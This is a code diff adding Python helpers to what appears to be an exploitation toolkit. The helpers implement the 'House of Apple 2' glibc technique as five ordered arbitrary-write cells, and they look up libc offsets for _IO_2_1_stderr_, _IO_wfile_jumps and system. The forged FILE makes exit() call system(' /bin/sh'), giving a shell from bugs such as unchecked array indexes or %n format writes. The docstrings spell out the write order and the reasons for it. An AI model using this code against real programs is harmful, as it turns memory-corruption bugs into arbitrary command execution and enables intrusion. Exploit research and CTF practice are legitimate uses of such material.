@@ -245,6 +245,67 @@ HOA2_BLOB_MIN = 0x2A8
 HOA2_SPLIT_MIN = 0xE8                                  # the larger of the split path's two writes
 
 
+#: House of Apple 2 as a handful of 8-byte CELLS, for a primitive that writes one word at a
+#: chosen address (CWE-129 `arr[i] = v`, a %n format write, a tcache chunk placed over a pointer)
+#: rather than a run of bytes. The one-piece blob cannot be delivered that way at all: the 0x300
+#: bytes land over `_IO_2_1_stdout_` AND the `stdout`/`stderr`/`stdin` pointer variables that
+#: follow it, and a cell-at-a-time writer runs the target's own code -- its next prompt -- between
+#: every write, so a half-built FILE is executed. Five cells, and the FILE is one the program
+#: never touches, so nothing in between runs through it.
+_HOA2_CELL_COUNT = 5
+
+
+def house_of_apple2_cells(fp_addr: int, *, wide_data: int, wide_vtable: int, wfile_jumps: int,
+                          system: int, command: bytes = b" /bin/sh") -> list:
+    """House of Apple 2 delivered as [(address, 8-byte value)] -- five arbitrary writes -- instead
+    of `build_house_of_apple2`'s one 0x300 blob. For an ARBITRARY-WRITE primitive that places one
+    word at a time (an unchecked array index, a %n write) this is the only deliverable form.
+
+    `fp_addr` is the FILE to forge. It must be one the program does not use between the writes:
+    `_IO_2_1_stderr_` is the pick for a program that writes only to stdout, because a forged FILE
+    is read by nothing until `exit()` walks `_IO_list_all`. `wide_data` is that FILE's REAL
+    `_wide_data` (read out of the target, not guessed; its `_IO_buf_base` is already NULL for a
+    stream that never saw a wide character, which is the condition `_IO_wdoallocbuf` tests).
+    `wide_vtable` is any writable 8 bytes whose +0x68 we may set -- the target's own global array
+    does nicely, which keeps the forgery inside memory the bug already reaches.
+
+    The order is load-bearing, so the caller writes them in sequence:
+
+      1. `wide_vtable + 0x68 := system`  -- the fake `__doallocate`, outside the FILE.
+      2. `wide_data + 0xE0 := wide_vtable` -- the fake `_wide_vtable`, still outside the FILE.
+      3. `fp + 0x28 := 1` -- `_IO_write_ptr > _IO_write_base`, the test `_IO_flush_all` applies.
+      4. `fp + 0xD8 := _IO_wfile_jumps` -- `_IO_OVERFLOW` becomes `_IO_wfile_overflow`.
+      5. `fp + 0x00 := command` -- `_flags` doubles as the string, and rdi == fp at the call.
+
+    `_flags` is last because the command's first byte (a space, 0x20) sets `_IO_ERR_SEEN`: writing
+    it any earlier stops that FILE being usable, which matters when the only forgeable FILE is one
+    the program still reads from. `exit()` then flushes the forged FILE: `_IO_wfile_overflow` sees
+    a NULL wide `_IO_buf_base`, calls `_IO_wdoallocbuf` -> `_wide_data->_wide_vtable->__doallocate(fp)`
+    == `system(fp)`, and fp's first bytes are the command."""
+    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
+        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
+    cmd = _struct.unpack("<Q", (command + b"\x00" * 8)[:8])[0]
+    return [(wide_vtable + _JT_DOALLOCATE, system),
+            (wide_data + _WD_VTABLE, wide_vtable),
+            (fp_addr + _F_WRITE_PTR, 1),
+            (fp_addr + _F_VTABLE, wfile_jumps),
+            (fp_addr + _F_FLAGS, cmd)]
+
+
+def house_of_apple2_cell_targets(libc_data: bytes) -> dict:
+    """The libc offsets `house_of_apple2_cells` needs. `_IO_2_1_stderr_` rather than stdout: the
+    cells are written one at a time with the target's own code running in between, so the forged
+    FILE has to be one that code does not use."""
+    from . import rop
+    want = ("_IO_2_1_stderr_", "_IO_wfile_jumps", "system")
+    s = rop.libc_symbols(libc_data, want)
+    if not all(k in s for k in want):
+        return {}
+    return {"fp": s["_IO_2_1_stderr_"], "wfile_jumps": s["_IO_wfile_jumps"],
+            "system": s["system"], "fp_name": "_IO_2_1_stderr_",
+            "wide_data_field": _F_WIDE_DATA, "wide_buf_base_field": _WD_BUF_BASE}
+
+
 def house_of_apple2_targets(libc_data: bytes) -> dict:
     """The libc offsets House of Apple 2 needs: the FILE to corrupt (`_IO_2_1_stdout_`), the vtable
     (`_IO_wfile_jumps`) and `system`. Relocate each by the leaked libc base. {} if any is absent."""
